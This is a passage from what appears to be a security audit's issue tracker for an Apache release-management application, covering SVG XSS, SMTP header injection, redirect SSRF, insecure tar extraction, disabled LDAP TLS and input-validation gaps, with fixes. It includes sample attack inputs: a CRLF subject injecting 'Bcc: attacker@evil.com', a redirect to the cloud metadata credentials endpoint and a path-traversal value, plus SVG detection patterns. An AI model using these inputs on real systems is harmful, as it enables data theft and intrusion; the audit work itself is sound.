    'script', 'foreignObject', 'iframe', 'object', 'embed',
    'set', 'animate', 'animateMotion', 'animateTransform'
}

EVENT_HANDLER_PATTERN = re.compile(r'^on[a-z]+$', re.IGNORECASE)

def sanitize_svg(svg_content: str) -> str:
    """Sanitize SVG content by removing dangerous elements and attributes."""
    try:
        tree = DefusedET.fromstring(svg_content)
    except ET.ParseError:
        raise ValueError("Invalid SVG")
    
    _sanitize_element(tree)
    return ET.tostring(tree, encoding='unicode')

def _sanitize_element(element):
    """Recursively sanitize SVG element tree."""
    # Remove dangerous tags
    if element.tag.split('}')[-1] in DANGEROUS_TAGS:
        element.clear()
        return
    
    # Remove event handler attributes
    for attr in list(element.attrib.keys()):
        if EVENT_HANDLER_PATTERN.match(attr):
            del element.attrib[attr]
        # Remove javascript: and data: URIs
        if attr in ('href', 'xlink:href'):
            value = element.attrib[attr]
            if value.startswith(('javascript:', 'data:text/html')):
                del element.attrib[attr]
    
    # Recurse to children
    for child in element:
        _sanitize_element(child)
```

Apply wherever SVG content may reach a browser.

### Acceptance Criteria
- [ ] SVG sanitization function is created in atr/svg_sanitize.py
- [ ] Dangerous tags are removed (script, foreignObject, etc.)
- [ ] Event handler attributes are stripped
- [ ] javascript: and data:text/html URIs are removed
- [ ] Only safe SVG tags are allowed
- [ ] Unit tests verify sanitization of malicious SVG
- [ ] XSS attempts via SVG are blocked
- [ ] Legitimate SVG rendering still works

### References
- Source reports: L2:1.3.4.md
- Related findings: FINDING-110
- ASVS sections: 1.3.4

### Priority
Medium

---

## Issue: FINDING-110 - Archive Extraction Does Not Inspect or Sanitize SVG Files

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The archive extraction process in archives.py extracts ALL file types without SVG inspection. SVG is absent from the detection module's _EXPECTED dictionary which covers 18 file extension categories but omits image formats entirely (no .svg, .png, .jpg, etc.). Authenticated users can upload archives containing .svg files, which are extracted to disk unmodified. Malicious SVG files in release archives pass all validation undetected. If any download, preview, or serving mechanism exposes these files to browsers, XSS is achievable.

### Details
In atr/archives.py lines 28-63, the extraction process handles all file types. Lines 39-47 show extraction logic without SVG-specific handling.

In atr/detection.py lines 26-49, the _EXPECTED dictionary covers .tar.gz, .jar, .pom, .dll, .so, .exe, etc., but no image formats including .svg.

The detection.validate_directory() function skips SVG files (not in _EXPECTED), leaving SVG on disk with full scriptable content including <script> tags, <foreignObject>, and event handlers.

### Recommended Remediation
Add SVG to the detection module and implement validation:

**Step 1:** Add .svg to _EXPECTED dictionary in atr/detection.py:

```python
_SVG_TYPES = {'image/svg+xml'}

_EXPECTED = {
    # ... existing entries ...
    '.svg': _SVG_TYPES,
}
```

**Step 2:** Implement _validate_svg_file() in detection.py:

```python
import re

_DANGEROUS_SVG_PATTERNS = [
    re.compile(r'<script[>\s]', re.IGNORECASE),
    re.compile(r'<foreignObject[>\s]', re.IGNORECASE),
    re.compile(r'\son\w+\s*=', re.IGNORECASE),  # Event handlers
    re.compile(r'javascript:', re.IGNORECASE),
]

def _validate_svg_file(path: pathlib.Path) -> None:
    """Check SVG file for dangerous scriptable content."""
    content = path.read_text(encoding='utf-8', errors='ignore')
    
    for pattern in _DANGEROUS_SVG_PATTERNS:
        if pattern.search(content):
            raise ValidationError(
                f"SVG file contains dangerous content: {path.name}"
            )
```

**Step 3:** Call validation in validate_directory():

```python
if suffix == '.svg':
    _validate_svg_file(file_path)
```

### Acceptance Criteria
- [ ] .svg is added to _EXPECTED dictionary
- [ ] SVG files are inspected during archive validation
- [ ] <script> tags in SVG are detected and rejected
- [ ] <foreignObject> tags in SVG are detected and rejected
- [ ] Event handler attributes (on*=) are detected and rejected
- [ ] javascript: URIs are detected and rejected
- [ ] Unit tests verify SVG validation
- [ ] Malicious SVG in archives is quarantined
- [ ] Legitimate SVG files pass validation

### References
- Source reports: L2:1.3.4.md
- Related findings: FINDING-109
- ASVS sections: 1.3.4

### Priority
Medium

---

## Issue: FINDING-111 - SMTP Header Injection Vulnerability in Bundled Legacy Library

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The asfpy/messaging.py module contains a legacy email sending function that constructs email messages using raw string formatting without proper CRLF sanitization. This allows SMTP header injection through multiple parameters including subject, sender, recipient, headers dict, and thread_key. Additionally, the module uses assert statements for validation which are disabled with Python's -O flag. Mitigating factor: This module does not appear to be imported by any ATR application code—the application exclusively uses atr/mail.py for email operations.

### Details
In asfpy/messaging.py:
- Lines 130-140: mail() function constructs RFC 2822 message with string interpolation
- Line 95: assert statement for validation (disabled with -O flag)
- Line 120: Subject header constructed without CRLF sanitization
- Line 110: From/To headers constructed without CRLF sanitization

Example vulnerability:
```python
subject = "Test\r\nBcc: attacker@evil.com"
# Results in:
# Subject: Test
# Bcc: attacker@evil.com
```

An attacker could inject:
- Bcc/Cc headers to send copies to unauthorized recipients
- Subject override
- Content-Type manipulation
- Additional arbitrary headers

### Recommended Remediation
**Preferred:** Remove asfpy/messaging.py from the repository if it's not needed, or clearly mark it as deprecated/unused.

```bash
git rm asfpy/messaging.py
# Document in CHANGELOG: "Removed unused legacy messaging.py module with SMTP injection vulnerability"
```

**Alternative:** If the module must be retained, replace string formatting with Python's email.message.EmailMessage API:

```python
from email.message import EmailMessage
from email import policy
from email.utils import make_msgid

def mail(recipient, subject, message, sender=None, headers=None, thread_key=None):
    msg = EmailMessage(policy=policy.SMTPUTF8)
    
    # Use proper API methods (automatically validates headers)
    msg['To'] = recipient
    msg['From'] = sender or DEFAULT_SENDER
    msg['Subject'] = subject
    msg['Message-ID'] = make_msgid()
    
    if thread_key:
        msg['In-Reply-To'] = thread_key
        msg['References'] = thread_key
    
    if headers:
        for key, value in headers.items():
            msg[key] = value  # EmailMessage validates headers
    
    msg.set_content(message)
    
    # Send with SMTP
```

Add linting rule to prevent importing asfpy.messaging.mail in any ATR module.

### Acceptance Criteria
- [ ] asfpy/messaging.py is removed or marked as deprecated
- [ ] No ATR code imports asfpy.messaging
- [ ] If retained, EmailMessage API is used for header construction
- [ ] CRLF sequences in headers are rejected or escaped
- [ ] assert statements are replaced with proper validation
- [ ] Unit tests verify SMTP header injection is prevented
- [ ] Linting rule prevents new usage

### References
- Source reports: L2:1.3.11.md
- Related findings: None
- ASVS sections: 1.3.11

### Priority
Medium

---

## Issue: FINDING-112 - HTTP Redirects Followed Without Target Domain Validation

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The _fetch_keys_from_url function uses allow_redirects=True without validating redirect target domains. If downloads.apache.org were compromised or DNS-hijacked, the application would follow redirects to arbitrary destinations including cloud metadata endpoints (169.254.169.254), internal services, or attacker-controlled servers. Response data from redirect targets is read and stored in database.

### Details
In atr/post/keys.py lines 186-206 and 207-210, and scripts/keys_import.py lines 137-140, the _fetch_keys_from_url function:

```python
async with session.get(url, allow_redirects=True) as response:
    # Follows redirects without validation
    content = await response.read()
```

Attack scenarios if downloads.apache.org is compromised:
1. Redirect to http://169.254.169.254/latest/meta-data/iam/security-credentials/ (cloud metadata)
2. Redirect to internal services (SSRF)
3. Redirect to attacker server that returns malicious key data

### Recommended Remediation
Implement redirect target validation:

```python
_ALLOWED_KEYS_DOMAINS = {
    'downloads.apache.org',
    'dlcdn.apache.org',
    'archive.apache.org',
}

def _validate_keys_url(url: str) -> bool:
    """Validate URL for key fetching."""
    parsed = urllib.parse.urlparse(url)
    
    # Require HTTPS
    if parsed.scheme != 'https':
        return False
    
    # Check domain against allowlist
    if parsed.hostname not in _ALLOWED_KEYS_DOMAINS:
        return False
    
    # Require standard port
    if parsed.port and parsed.port != 443:
        return False
    
    return True

async def _fetch_keys_from_url(session, url):
    """Fetch keys with redirect validation."""
    # Set allow_redirects=False
    async with session.get(url, allow_redirects=False) as response:
        if response.status in (301, 302, 303, 307, 308):
            # Manually handle redirect with validation
            redirect_url = response.headers.get('Location')
            if not _validate_keys_url(redirect_url):
                raise ValueError(f"Invalid redirect target: {redirect_url}")
            return await _fetch_keys_from_url(session, redirect_url)
        
        # Process response
        content = await response.read()
        return content
```

### Acceptance Criteria
- [ ] Redirects are manually handled with validation
- [ ] Only HTTPS URLs to allowed domains are followed
- [ ] Cloud metadata endpoints are not accessible
- [ ] Internal IPs are not accessible (169.254.*, 10.*, 192.168.*, etc.)
- [ ] Port must be 443 for HTTPS
- [ ] Unit tests verify redirect validation
- [ ] SSRF attempts are blocked
- [ ] Legitimate redirects within Apache domains still work

### References
- Source reports: L2:1.3.6.md
- Related findings: None
- ASVS sections: 1.3.6

### Priority
Medium

---

## Issue: FINDING-113 - Thread ID Parameter Lacks Format Validation Before Server-Side Request

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The votes function accepts thread_id as plain str type without format validation or safe type wrapper. No rejection of path traversal sequences (../../), fragments (#), or query parameters (?). While JWT authentication limits attack surface and domain remains hardcoded, lack of validation creates risk of path traversal within lists.apache.org domain or API endpoint manipulation if downstream util.thread_messages() doesn't properly validate.

### Details
In atr/tabulate.py lines 131-176 and 261-267, the votes function:

```python
async def votes(committee: sql.Committee | None, thread_id: str):
    # thread_id is plain str with no validation
    messages = await util.thread_messages(thread_id)
```

Potential attacks if thread_id is not validated downstream:
- Path traversal: `../../other/thread`
- Fragment injection: `thread#fragment`
- Query parameter injection: `thread?param=value`

While JWT authentication is required, defense-in-depth requires input validation.

### Recommended Remediation
Create ThreadId safe type in atr/models/safe.py:

```python
class ThreadId(SafeType):
    """Thread ID from mailing list archive (alphanumeric only)."""
    
    _pattern = re.compile(r'^[a-zA-Z0-9]{1,128}$')
    
    @classmethod
    def _additional_validations(cls, v: str) -> None:
        if not cls._pattern.match(v):
            raise ValueError(
                "Thread ID must be 1-128 alphanumeric characters"
            )
```

Update function signature:

```python
async def votes(
    committee: sql.Committee | None,
    thread_id: ThreadId  # Use safe type
):
    messages = await util.thread_messages(str(thread_id))
```

**Alternative:** Add _validate_thread_id() function at entry point:

```python
def _validate_thread_id(thread_id: str) -> str:
    if not re.match(r'^[a-zA-Z0-9]{1,128}$', thread_id):
        raise ValueError("Invalid thread ID format")
    return thread_id

async def votes(committee, thread_id: str):
    thread_id = _validate_thread_id(thread_id)
    ...
```

### Acceptance Criteria
- [ ] thread_id uses ThreadId safe type or is validated
- [ ] Only alphanumeric characters are allowed
- [ ] Length is limited to 128 characters
- [ ] Path traversal sequences are rejected
- [ ] Query parameters and fragments are rejected
- [ ] Unit tests verify validation
- [ ] Legitimate thread IDs still work

### References
- Source reports: L2:1.3.6.md
- Related findings: None
- ASVS sections: 1.3.6

### Priority
Medium

---

## Issue: FINDING-114 - Tar Archive Extraction Uses Explicitly Insecure Default Filter

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The extract_member() method uses tar_filter='fully_trusted' as its default parameter value. Python's PEP 706 and official documentation explicitly identify this filter as insecure. The fully_trusted filter allows absolute paths, path traversal sequences (../), device nodes, symlinks pointing outside extraction directory, and setuid/setgid bits. While mitigating controls exist (pre-extraction validation in check_archive_safety(), quarantine workflow with SecurityConfig), the insecure default violates the principle of secure defaults.

### Details
In atr/tarzip.py lines 130-154, the extract_member() method:

```python
def extract_member(
    self,
    member: tarfile.TarInfo,
    path: str = "",
    set_attrs: bool = True,
    numeric_owner: bool = False,
    tar_filter: str = 'fully_trusted'  # INSECURE DEFAULT
) -> str | None:
```

PEP 706 states: "The 'fully_trusted' filter should only be used if the archive is fully trusted. It disables all security features."

ASVS 1.5.2 states: "Deserialization mechanisms that are explicitly defined as insecure must not be used with untrusted input."

### Recommended Remediation
Change the default tar_filter parameter from 'fully_trusted' to 'data':

```python
def extract_member(
    self,
    member: tarfile.TarInfo,
    path: str = "",
    set_attrs: bool = True,
    numeric_owner: bool = False,
    tar_filter: str = 'data'  # SECURE DEFAULT per PEP 706
) -> str | None:
    """Extract a single member from the tar archive.
    
    Args:
        tar_filter: Extraction filter. Options:
            - 'data' (default, secure): Removes unsafe features
            - 'tar': Compatible with most archives
            - 'fully_trusted': INSECURE - only for verified trusted archives
    
    The 'fully_trusted' filter should ONLY be used for archives that have been
    verified to come from trusted sources. It disables all security features.
    """
```

Add test cases:

```python
def test_extract_rejects_path_traversal():
    """Verify path traversal sequences are blocked with default filter."""
    
def test_extract_rejects_absolute_paths():
    """Verify absolute paths are converted to relative with default filter."""
    
def test_extract_handles_external_symlinks():
    """Verify symlinks pointing outside extraction dir are made safe."""
```

### Acceptance Criteria
- [ ] Default tar_filter is changed to 'data'
- [ ] Docstring documents security implications of each filter
- [ ] Path traversal sequences are sanitized by default
- [ ] Absolute paths are converted to relative by default
- [ ] External symlinks are blocked or made safe by default
- [ ] Unit tests verify secure defaults
- [ ] Documentation updated with filter security guidance
- [ ] Code review confirms no callers depend on insecure default

### References
- Source reports: L2:1.5.2.md
- Related findings: None
- ASVS sections: 1.5.2

### Priority
Medium

---

## Issue: FINDING-115 - TLS Certificate Validation Disabled on LDAP Connection

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The LDAP client explicitly disables TLS certificate verification by calling set_cert_policy('allow'). This configuration allows the client to accept any certificate presented by the LDAP server, including self-signed or attacker-controlled certificates. A TODO comment indicates this is a known temporary configuration. An attacker positioned on the network path can intercept the TLS connection, present a self-signed certificate (which the client will accept), intercept authentication credentials, and modify LDAP query results.

### Details
In asfpy/aioldap.py line 103:

```python
self.__client.set_cert_policy('allow')  # TODO: Fix this
```

This disables all TLS certificate verification, allowing:
- Self-signed certificates
- Expired certificates
- Certificates with wrong hostname
- Attacker-controlled certificates

Attack scenario:
1. Attacker performs MITM between application and LDAP server
2. Attacker presents self-signed certificate
3. Application accepts certificate (set_cert_policy('allow'))
4. Attacker intercepts bind DN and password
5. Attacker modifies LDAP query results (group memberships, etc.)

This affects all LDAP operations in the ASFQuart OAuth authentication flow.

### Recommended Remediation
Enable proper TLS certificate validation:

**Option 1 (Recommended):** Require valid certificates with system CA trust:

```python
# Remove the allow policy
# self.__client.set_cert_policy('allow')  # DELETE

# The ldap3 library will use system CA bundle by default
# with set_cert_policy('demand') or omit the call entirely
```

**Option 2:** Pin the specific Apache LDAP CA certificate:

```python
from ldap3 import Tls
import ssl

tls = Tls(
    ca_certs_file='/path/to/apache-ldap-ca.pem',
    validate=ssl.CERT_REQUIRED,
    version=ssl.PROTOCOL_TLS
)

self.__client = ldap3.Connection(
    server,
    user=bind_dn,
    password=password,
    tls=tls
)
```

**Option 3:** Use system CA bundle with certifi:

```python
import certifi

tls = Tls(
    ca_certs_file=certifi.where(),
    validate=ssl.CERT_REQUIRED
)
```

### Acceptance Criteria
- [ ] TLS certificate validation is enabled
- [ ] set_cert_policy('allow') is removed
- [ ] Valid certificates are required (CERT_REQUIRED)
- [ ] System CA bundle or pinned certificate is used
- [ ] Self-signed attacker certificates are rejected
- [ ] Hostname verification is enabled
- [ ] TODO comment is removed
- [ ] Unit tests verify certificate validation
- [ ] LDAP authentication still works with valid certificates

### References
- Source reports: L2:1.3.8.md
- Related findings: None
- ASVS sections: 1.3.8

### Priority
Medium

---

## Issue: FINDING-116 - Pagination Offset Validation Never Executes Due to Typo

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The pagination offset validation contains a typo that prevents it from ever executing. The function checks for attribute 'offest' instead of 'offset', causing the validation block to be skipped for all requests. An authenticated API user can supply arbitrarily large offset values, causing expensive database queries (full table scan + skip N rows), performance degradation for all users, and potential denial of service through resource exhaustion.

### Details
In atr/api/__init__.py lines 45-51:

```python
if hasattr(query_args, "offest"):  # TYPO: should be "offset"
    if query_args.offest is not None and query_args.offest < 0:
        raise exceptions.RequestValidationError("Offest must be >= 0")
```

The validation block never executes because the attribute name is misspelled. This allows:
- offset=-1000000 (negative offset)
- offset=999999999 (extremely large offset causing full table scan)
- Unbounded resource consumption per request

Multiple endpoints in atr/blueprints/api.py accept offset parameter without validation.

### Recommended Remediation
Fix the typo from 'offest' to 'offset' and add comprehensive validation:

```python
if hasattr(query_args, "offset"):  # FIX: correct attribute name
    if query_args.offset is not None:
        if query_args.offset < 0:
            raise exceptions.RequestValidationError("Offset must be >= 0")
        if query_args.offset > 1000000:  # Add maximum
            raise exceptions.RequestValidationError("Offset must be <= 1000000")

if hasattr(query_args, "limit"):
    if query_args.limit is not None:
        if query_args.limit < 1:
            raise exceptions.RequestValidationError("Limit must be >= 1")
        if query_args.limit > 1000:  # Add maximum
            raise exceptions.RequestValidationError("Limit must be <= 1000")
```

### Acceptance Criteria
- [ ] Typo 'offest' is corrected to 'offset'
- [ ] Offset must be between 0 and 1000000
- [ ] Limit must be between 1 and 1000
- [ ] Unit tests verify validation is enforced
- [ ] API rejects negative offsets
- [ ] API rejects extremely large offsets
- [ ] Database query performance is protected
- [ ] Existing pagination functionality works correctly

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Medium

---

## Issue: FINDING-117 - Trusted Publishing Cross-Field Validation Bypassed Via Web Form

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The web form path for editing trusted publishing configuration does not call the existing validation function _normalise_trusted_publishing_update(), while the API path does. This creates an inconsistency where invalid configurations can be saved via the web interface but would be rejected via the API. Workflow paths not starting with '.github/workflows/' could weaken trusted publisher verification, and repository names with slashes could cause path traversal issues in URL construction.

### Details
In atr/storage/writers/policy.py lines 178-188, the edit_trusted_publishing() function:

```python
async def edit_trusted_publishing(self, ...):
    # Directly updates database without validation
    release_policy.trusted_publishing_github_repository = github_repository_name
    release_policy.trusted_publishing_github_workflow = workflow_path
    await self.__write_as.db.commit()
```

The API path calls _normalise_trusted_publishing_update() which enforces:
- workflow_path must start with '.github/workflows/'
- github_repository_name must not contain slashes beyond 'org/repo'

The web form path bypasses this validation entirely.

### Recommended Remediation
Call the existing _normalise_trusted_publishing_update() function in edit_trusted_publishing():

```python
async def edit_trusted_publishing(
    self,
    release_policy: sql.ReleasePolicy,
    github_repository_name: str,
    workflow_path: str,
) -> None:
    """Edit trusted publishing configuration with validation."""
    
    # Prepare values dict for validation
    values = {
        'github_repository_name': github_repository_name,
        'workflow_path': workflow_path,
    }
    
    # Apply same validation as API path
    normalized = _normalise_trusted_publishing_update(values)
    
    # Apply normalized values
    release_policy.trusted_publishing_github_repository = (
        normalized['github_repository_name']
    )
    release_policy.trusted_publishing_github_workflow = (
        normalized['workflow_path']
    )
    
    await self.__write_as.db.commit()
```

### Acceptance Criteria
- [ ] edit_trusted_publishing() calls _normalise_trusted_publishing_update()
- [ ] Web form and API enforce same validation rules
- [ ] workflow_path must start with '.github/workflows/'
- [ ] github_repository_name format is validated
- [ ] Invalid configurations are rejected with clear error
- [ ] Unit tests verify validation consistency
- [ ] Existing trusted publishing functionality works

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Medium

---

## Issue: FINDING-118 - Archive Extraction Size Limit Bypass via Metadata File Counter Reset

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The archive extraction functions contain a bug where returning 0 instead of total_extracted when skipping metadata files causes the extraction size counter to reset. This allows attackers to bypass the documented maximum extraction size limit (1GB) by interleaving skipped files between large files. Authenticated users can bypass documented extraction size limits, potentially causing disk exhaustion during SBOM generation or archive processing.

### Details
In atr/archives.py:
- Lines 95-98: Returns 0 when skipping ._* metadata files
- Lines 100-102: Returns 0 when skipping device files
- Lines 159-161: Returns 0 when skipping unsafe paths

Example exploitation:
```
file1.bin (500MB) - counter = 500MB
._metadata - returns 0, counter RESETS to 0
file2.bin (500MB) - counter = 500MB
._metadata - returns 0, counter RESETS to 0
file3.bin (500MB) - counter = 500MB
Total: 1.5GB extracted despite 1GB limit
```

### Recommended Remediation
Change the return statement from 'return 0, extracted_paths' to 'return total_extracted, extracted_paths':

```python
# When skipping metadata files (._* prefix)
if member_name.startswith('._'):
    log.info(f"Skipping macOS metadata file: {member_name}")
    return total_extracted, extracted_paths  # FIX: Preserve counter

# When skipping device files
if tar_info.isdev():
    log.info(f"Skipping device file: {member_name}")
    return total_extracted, extracted_paths  # FIX: Preserve counter

# When skipping unsafe paths
if not safe_path:
    log.warning(f"Skipping unsafe path: {member_name}")
    return total_extracted, extracted_paths  # FIX: Preserve counter
```

### Acceptance Criteria
- [ ] All early returns preserve total_extracted counter
- [ ] Size limit is enforced regardless of skipped members
- [ ] Unit tests verify counter is not reset
- [ ] Integration tests verify limit with interleaved metadata
- [ ] Extraction size limit cannot be bypassed
- [ ] Existing extraction functionality works correctly

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Medium

---

## Issue: FINDING-119 - VersionKey Safe Type Missing Documented Business Rules

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The safe.VersionKey type used for API URL parameter validation is missing two business rules that are documented and enforced in the web form validation function version_key_error(). This creates an inconsistency where version keys accepted via the API would be rejected via web forms. The missing rules are: (1) must not be the literal string 'version', and (2) must not contain consecutive special characters (+, ., -).

### Details
In atr/util.py lines 81-87, the version_key_error() function enforces:

```python
if version_key.lower() == "version":
    return "Version key must not be the literal string 'version'"

if re.search(r'[+.-]{2,}', version_key):
    return "Version key must not contain consecutive special characters"
```

In atr/models/safe.py lines 95-105, the VersionKey safe type only validates:
- ASCII alphanumeric, +, ., -, _ characters
- Length 1-200

The TODO comment acknowledges missing rules but they're not implemented.

### Recommended Remediation
Add the missing validation rules to safe.VersionKey._additional_validations():

```python
class VersionKey(SafeType):
    """Version key for releases."""
    
    _pattern = re.compile(r'^[a-zA-Z0-9+._-]{1,200}$')
    
    @classmethod
    def _additional_validations(cls, v: str) -> None:
        # NEW: Reject literal string 'version'
        if v.lower() == 'version':
            raise ValueError(
                "Version key must not be the literal string 'version'"
            )
        
        # NEW: Reject consecutive special characters
        if re.search(r'[+.-]{2,}', v):
            raise ValueError(
                "Version key must not contain consecutive special characters"
            )
```

Remove the TODO comment and duplicate rules from version_key_error() after confirming both paths enforce the same validation.

### Acceptance Criteria
- [ ] safe.VersionKey rejects literal string 'version' (case-insensitive)
- [ ] safe.VersionKey rejects consecutive +, ., or - characters
- [ ] API and web form validation are consistent
- [ ] Unit tests verify both rules are enforced
- [ ] TODO comment is removed
- [ ] Duplicate validation logic is consolidated
- [ ] Existing version key functionality works

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Medium

---

## Issue: FINDING-120 - Committee Key Fields Lack Type Validation in Key Management Forms

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Multiple key management forms use plain str or form.StrList for committee key fields instead of the available safe.CommitteeKey type. This means form-level validation relies entirely on downstream authorization checks rather than validating the data format at the input boundary. Malformed committee keys produce confusing error messages ('Access denied' instead of 'Invalid format').

### Details
In atr/shared/keys.py:
- Line 53: AddKeyForm.committee_key uses str
- Line 66: ImportKeyForm.committee_key uses str
- Line 80: DeleteKeyForm.committee_key uses str
- Line 110: AssignKeyForm.selected_committees uses form.StrList
- Line 130: UnassignKeyForm.selected_committees uses form.StrList

Example:
```python
class AddKeyForm(form.Form):
    committee_key: str  # Should use safe.CommitteeKey
```

This allows malformed input like `../../../etc/passwd` to reach authorization layer, where it's rejected with generic "Access denied" instead of clear "Invalid committee key format".

### Recommended Remediation
Change committee_key fields from str to safe.CommitteeKey:

```python
class AddKeyForm(form.Form):
    committee_key: safe.CommitteeKey  # Use safe type

class ImportKeyForm(form.Form):
    committee_key: safe.CommitteeKey  # Use safe type

class DeleteKeyForm(form.Form):
    committee_key: safe.CommitteeKey  # Use safe type
```

For selected_committees fields (StrList), add a Pydantic field_validator:

```python
class AssignKeyForm(form.Form):
    selected_committees: form.StrList
    
    @pydantic.field_validator('selected_committees')
    @classmethod
    def validate_committees(cls, v: list[str]) -> list[str]:
        # Validate each committee key
        for key in v:
            safe.CommitteeKey(key)  # Raises if invalid
        return v
```

### Acceptance Criteria
- [ ] All committee_key fields use safe.CommitteeKey
- [ ] selected_committees fields have field_validator
- [ ] Invalid committee keys are rejected at form boundary
- [ ] Clear error messages for malformed keys
- [ ] Authorization checks receive validated keys only
- [ ] Unit tests verify validation
- [ ] Existing key management functionality works

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Medium

---

## Issue: FINDING-121 - Task Model SvnImport Uses Plain Strings for Validated-Type Fields

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The SvnImport task model uses plain str types for fields that have validated safe types in the originating web form. Most critically, the revision field has no validation anywhere in the codebase—neither at form, task model, nor handler level. Task deserialization doesn't re-apply safe type constraints from original form, and invalid revision values cause opaque SVN errors rather than clear validation errors.

### Details
In atr/tasks/svn.py lines 20-27:

```python
class SvnImport(pydantic.BaseModel):
    svn_path: str          # Should be safe.RelPath
    project_key: str       # Should be safe.ProjectKey
    version_key: str       # Should be safe.VersionKey
    prefix: str            # Should be safe.OptionalRelPath
    revision: str          # NO VALIDATION ANYWHERE
    asf_uid: str           # No format validation
```

The originating form in atr/shared/upload.py uses safe types:
- svn_path: safe.RelPath
- project_key: safe.ProjectKey
- version_key: safe.VersionKey

But the task model loses these constraints when serialized to database.

### Recommended Remediation
Update SvnImport model to use safe types:

```python
class SvnImport(pydantic.BaseModel):
    svn_path: safe.RelPath
    project_key: safe.ProjectKey
    version_key: safe.VersionKey
    prefix: safe.OptionalRelPath
    revision: str  # Add validation below
    asf_uid: str   # Add validation below
    
    @pydantic.field_validator('revision')
    @classmethod
    def validate_revision(cls, v: str) -> str:
        """Validate SVN revision format."""
        # Must be 'HEAD' or positive integer up to 10 digits
        if v == 'HEAD':
            return v
        if not re.match(r'^\d{1,10}$', v):
            raise ValueError(
                "Revision must be 'HEAD' or numeric (1-10 digits)"
            )
        return v
    
    @pydantic.field_validator('asf_uid')
    @classmethod
    def validate_asf_uid(cls, v: str) -> str:
        """Validate ASF UID format."""
        if not re.match(r'^[-_a-z0-9]{3,32}$', v):
            raise ValueError("Invalid ASF UID format")
        return v
```

### Acceptance Criteria
- [ ] SvnImport model uses safe types for all path fields
- [ ] revision field has format validation (HEAD or digits)
- [ ] asf_uid field has format validation
- [ ] Task deserialization enforces all constraints
- [ ] Clear error messages for invalid fields
- [ ] Unit tests verify validation at task model level
- [ ] Existing SVN import functionality works

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Medium

---

## Issue: FINDING-122 - PGP Fingerprint Lacks Structural Validation Rule

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
PGP key fingerprints have a well-defined format (40 hexadecimal characters), but no validation rule exists anywhere in the codebase—neither in documentation, safe type system, nor at handler level. Handlers accept arbitrary strings and include them in error messages. Error messages include unsanitized user input, and arbitrary strings are accepted causing unnecessary database queries.

### Details
In atr/get/keys.py lines 30-35 and atr/storage/writers/keys.py lines 65 and 93, fingerprint parameters use unsafe.UnsafeStr:

```python
async def export_key(fingerprint: unsafe.UnsafeStr):
    # No validation, fingerprint could be any string
    key = await data.key_by_fingerprint(fingerprint)
    if not key:
        # Unsanitized fingerprint in error message
        raise exceptions.NotFound(f"Key not found: {fingerprint}")
```

PGP fingerprints should be exactly 40 hexadecimal characters (SHA-1) or 64 characters (SHA-256), but arbitrary-length strings with any characters are accepted.

### Recommended Remediation
Create a safe.Fingerprint type:

```python
# In atr/models/safe.py
class Fingerprint(SafeType):
    """PGP key fingerprint (40 or 64 hex characters)."""
    
    _pattern = re.compile(r'^[0-9a-f]{40}$|^[0-9a-f]{64}$')
    
    @classmethod
    def _additional_validations(cls, v: str) -> None:
        # Convert to lowercase
        v = v.lower()
        if not cls._pattern.match(v):
            raise ValueError(
                "Fingerprint must be 40 or 64 lowercase hex characters"
            )
    
    def __new__(cls, value: str):
        # Normalize to lowercase
        normalized = value.lower()
        instance = super().__new__(cls, normalized)
        return instance
```

Update handlers to use safe.Fingerprint:

```python
async def export_key(fingerprint: safe.Fingerprint):
    key = await data.key_by_fingerprint(str(fingerprint))
    if not key:
        raise exceptions.NotFound("Key not found")  # No user input in message
```

Update storage writer functions:

```python
async def assign_key_to_committees(
    self,
    fingerprint: safe.Fingerprint,  # Use safe type
    committee_keys: list[safe.CommitteeKey],
) -> None:
    ...
```

### Acceptance Criteria
- [ ] safe.Fingerprint type validates 40 or 64 hex characters
- [ ] Fingerprints are normalized to lowercase
- [ ] All fingerprint parameters use safe.Fingerprint
- [ ] Invalid fingerprints are rejected at entry point
- [ ] Error messages do not include user input
- [ ] Unit tests verify fingerprint validation
- [ ] Existing key management functionality works

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Medium

---

## Issue: FINDING-123 - Vote Value Not Validated Against Documented Expected Format

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The vote parameter is documented in function docstrings as accepting '+1, 0, or -1', but no validation enforces this constraint. The value is directly interpolated into email bodies sent to permanent Apache mailing list archives. Authenticated users can inject arbitrary text into vote emails, and injected content becomes part of permanent mailing list archives, potentially creating misleading vote records.

### Details
In atr/storage/writers/vote.py lines 27-45 and 62-78:

```python
async def send_user_vote(
    self,
    ...
    vote: str,  # Documented as '+1, 0, or -1' but not validated
) -> None:
    """
    ...
    vote: str
        User's vote (+1, 0, or -1)
    """
